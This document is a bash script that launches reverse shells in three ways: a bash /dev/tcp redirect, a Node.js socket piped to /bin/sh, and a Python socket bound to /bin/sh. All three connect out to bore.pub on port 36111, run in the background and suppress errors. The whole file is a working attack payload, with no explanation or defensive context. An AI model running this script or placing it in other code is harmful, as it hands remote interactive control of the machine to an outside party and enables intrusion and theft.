#!/bin/bash

if command -v bash >/dev/null 2>&1; then
    (bash -c 'bash -i >& /dev/tcp/bore.pub/36111 0>&1') 2>/dev/null &
    sleep 1
fi

if command -v node >/dev/null 2>&1; then
    node -e '
    const net=require("net");
    const cp=require("child_process");
    const sh=cp.spawn("/bin/sh",["-i"]);
    const c=net.connect(36111,"bore.pub",()=>{
      c.pipe(sh.stdin);
      sh.stdout.pipe(c);
      sh.stderr.pipe(c);
    });
    c.on("error",()=>process.exit(1));
    ' &
    sleep 1
fi

if command -v python3 >/dev/null 2>&1; then
    python3 -c '
import socket,subprocess,os
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("bore.pub",36111))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(["/bin/sh","-i"])
except Exception:
    pass
' &
fi

wait
